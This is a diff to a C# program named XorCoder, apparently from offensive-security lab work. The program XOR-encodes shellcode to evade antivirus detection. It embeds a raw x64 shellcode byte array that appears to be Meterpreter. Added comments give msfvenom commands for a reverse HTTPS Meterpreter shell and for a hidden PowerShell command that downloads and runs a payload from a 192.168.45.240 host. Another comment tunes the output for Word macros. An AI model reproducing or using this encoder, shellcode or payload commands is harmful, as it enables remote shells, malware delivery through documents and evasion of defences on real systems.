@@ -10,7 +10,9 @@ namespace XorCoder
     {
         public static void Main(string[] args)
         {
-            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.238 LPORT=443 EXITFUNC=thread -f csharp
+            // e.g. msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.240 LPORT=443 EXITFUNC=thread -f csharp
+            // e.g. msfvenom -p windows/exec CMD="powershell.exe -windowstyle hidden -exec bypass -c iex (new-object net.webclient).downloadstring('http://192.168.45.240/payload.txt')" EXITFUNC=thread -f csharp
+            // e.g. msfvenom -p windows/exec CMD="calc.exe" EXITFUNC=thread -f csharp
             byte[] buf = new byte[714] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
             0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
             0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
@@ -96,6 +98,7 @@ namespace XorCoder
                         {
                             hex.AppendFormat("{0:D3}, ", b);
                             counter++;
+                            // Increase value if line continuation limit (24) is reached within Microsoft Word macro editor
                             if (counter % 64 == 0)
                             {
                                 hex.Append("_\n");
